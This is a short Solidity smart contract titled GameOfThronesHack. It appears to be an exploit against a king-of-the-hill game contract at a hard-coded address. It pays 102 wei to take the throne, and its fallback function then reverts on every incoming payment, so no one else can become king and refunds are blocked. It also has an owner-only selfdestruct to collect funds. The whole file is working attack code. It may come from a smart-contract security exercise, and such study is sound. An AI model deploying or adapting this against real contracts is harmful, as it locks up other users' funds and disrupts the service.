pragma solidity ^0.5.0;

contract GameOfThronesHack {

  address payable public owner;
  bool public first;
  address payable got;

  modifier onlyOwner {
      require(msg.sender == owner);
      _;
  }

  constructor() public payable {
    owner = msg.sender;
    first = false;
    //address of deployed default GoT contract
    got = address(0x377F6f9cD220f19d2096842f53Be6eCE16D3BFCd);
  }

  function getBalance() public view returns(uint) {
      return address(this).balance;
  }

  function() external payable {
      if (first) {
          revert("Hoho! Forever King!");
      }
      got.call.value(102)("");
      first = true;

  }

  function destroy() onlyOwner public {
      selfdestruct(owner);
  }
 }
